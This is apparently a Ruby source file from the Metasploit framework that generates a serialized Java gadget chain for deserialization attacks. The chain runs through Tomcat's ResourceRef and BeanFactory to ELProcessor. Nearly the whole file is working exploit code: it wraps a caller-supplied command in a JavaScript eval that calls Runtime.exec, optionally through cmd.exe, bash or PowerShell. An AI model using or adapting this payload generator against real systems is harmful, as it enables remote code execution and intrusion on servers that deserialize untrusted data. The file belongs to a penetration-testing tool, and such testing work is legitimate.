# -*- coding: binary -*-

require 'stringio'
require 'rex/java'

module Msf
module Util
class JavaDeserialization
  class BeanFactory

    def self.generate(cmd, shell: nil)
      js_escaped = "String.fromCharCode(#{cmd.each_char.map(&:ord).map(&:to_s).join(',')})"

      # emulate the same behavior as the ysoserial-modified series,
      # see: https://github.com/pimps/ysoserial-modified/blob/1bd423d30ae87074f94d6b9b687c17162f122c3d/src/main/java/ysoserial/payloads/util/CmdExecuteHelper.java#L11
      payload_string = "{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec("
      case shell
      when 'cmd'
        payload_string << "[\\\"cmd.exe\\\",\\\"/c\\\",#{js_escaped}]"
      when 'bash'
        payload_string << "[\\\"/bin/bash\\\",\\\"-c\\\",#{js_escaped}]"
      when 'powershell'
        payload_string << "[\\\"powershell.exe\\\",\\\"-c\\\",#{js_escaped}]"
      when nil
        payload_string << js_escaped
      else
        raise NotImplementedError, "unsupported shell: #{shell.inspect}"
      end
      payload_string << ")\")}"

      builder = Rex::Java::Serialization::Builder.new
      stream = Rex::Java::Serialization::Model::Stream.new
      stream.contents = [
        builder.new_object(
          name: 'org.apache.naming.ResourceRef',
          serial: 1,
          flags: 2,
          annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
          super_class: builder.new_class(
            name: 'org.apache.naming.AbstractRef',
            serial: 1,
            flags: 2,
            annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
            super_class: builder.new_class(
              name: 'javax.naming.Reference',
              serial: 16773268283643759881,
              flags: 2,
              annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
            ).tap { |new_class|
              new_class.fields = [
                new_field(name: 'addrs', field_type: 'Ljava/util/Vector;'),
                new_field(name: 'classFactory', field_type: 'Ljava/lang/String;'),
                new_field(name: 'classFactoryLocation', field_type: new_ref(handle: 8257540)),
                new_field(name: 'className', field_type: new_ref(handle: 8257540))
              ]
            },
          ),
          data: [
            builder.new_object(
              name: 'java.util.Vector',
              serial: 15679138459660562177,
              flags: 3,
              annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
              data: [
                ['int', 0],
                ['int', 5],
                # stream.contents.first.class_data[0].class_data[2]
                builder.new_array(
                  values_type: 'java.lang.Object;',
                  name: '[Ljava.lang.Object;',
                  serial: 10434374826863044972,
                  flags: 2,
                  annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
                  # stream.contents.first.class_data[0].class_data[2].values
                  values: [
                    # stream.contents.first.class_data[0].class_data[2].values[0]
                    builder.new_object(
                      name: 'javax.naming.StringRefAddr',
                      serial: 9532981578571046089,
                      flags: 2,
                      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
                      super_class: builder.new_class(
                        name: 'javax.naming.RefAddr',
                        serial: 16978578953230397258,
                        flags: 2,
                        annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
                      ).tap { |new_class|
                        new_class.fields = [
                          new_field(name: 'addrType', field_type: new_ref(handle: 8257540))
                        ]
                      },
                      data: [
                        Rex::Java::Serialization::Model::Utf.new(stream, 'scope'),
                        Rex::Java::Serialization::Model::Utf.new(stream)
                      ]
                    ).tap { |new_object|
                      new_object.class_desc.description.fields = [
                        new_field(name: 'contents', field_type: new_ref(handle: 8257540))
                      ]
                    },
                    # stream.contents.first.class_data[0].class_data[2].values[1]
                    builder.new_object(
                      description: new_ref(handle: 8257547),
                      data: [
                        Rex::Java::Serialization::Model::Utf.new(stream, 'auth'),
                        new_ref(handle: 8257551)
                      ]
                    ),
                    builder.new_object(
                      description: new_ref(handle: 8257547),
                      data: [
                        Rex::Java::Serialization::Model::Utf.new(stream, 'singleton'),
                        Rex::Java::Serialization::Model::Utf.new(stream, 'true'),
                      ]
                    ),
                    # stream.contents.first.class_data[0].class_data[2].values[3]
                    builder.new_object(
                      description: new_ref(handle: 8257547),
                      data: [
                        Rex::Java::Serialization::Model::Utf.new(stream, 'forceString'),
                        Rex::Java::Serialization::Model::Utf.new(stream, 'x=eval'),
                      ]
                    ),
                    # stream.contents.first.class_data[0].class_data[2].values[4]
                    builder.new_object(
                      description: new_ref(handle: 8257547),
                      data: [
                        Rex::Java::Serialization::Model::Utf.new(stream, 'x'),
                        Rex::Java::Serialization::Model::Utf.new(stream, payload_string),
                      ]
                    ),
                    # stream.contents.first.class_data[0].class_data[2].values[5]
                    Rex::Java::Serialization::Model::NullReference.new,
                    Rex::Java::Serialization::Model::NullReference.new,
                    Rex::Java::Serialization::Model::NullReference.new,
                    Rex::Java::Serialization::Model::NullReference.new,
                    Rex::Java::Serialization::Model::NullReference.new,
                  ]
                )
              ]
            ).tap { |new_object|
              new_object.class_desc.description.fields = [
                new_field(type: 'int', name: 'capacityIncrement'),
                new_field(type: 'int', name: 'elementCount'),
                new_field(type: 'array', name: 'elementData', field_type: '[Ljava/lang/Object;')
              ]
            },
            Rex::Java::Serialization::Model::EndBlockData.new,
            Rex::Java::Serialization::Model::Utf.new(stream, 'org.apache.naming.factory.BeanFactory'),
            Rex::Java::Serialization::Model::NullReference.new
          ]
        ),
        Rex::Java::Serialization::Model::Utf.new(stream, 'javax.el.ELProcessor')
      ]
      stream.encode
    end

    class << self
      private
      # helper methods that are not in Rex::Java::Serialization::Builder
      def new_field(opts = {})
        name = Rex::Java::Serialization::Model::Utf.new(opts[:stream], opts[:name])
        if opts[:field_type].is_a? String
          field_type = Rex::Java::Serialization::Model::Utf.new(opts[:stream], opts[:field_type])
        else
          field_type = opts[:field_type]
        end

        field = Rex::Java::Serialization::Model::Field.new
        field.type = opts[:type] || 'object'
        field.name = name
        field.field_type = field_type
        field
      end

      def new_ref(opts = {})
        ref = Rex::Java::Serialization::Model::Reference.new(opts[:stream])
        ref.handle = opts[:handle]

        ref
      end
    end
  end
end
end
end
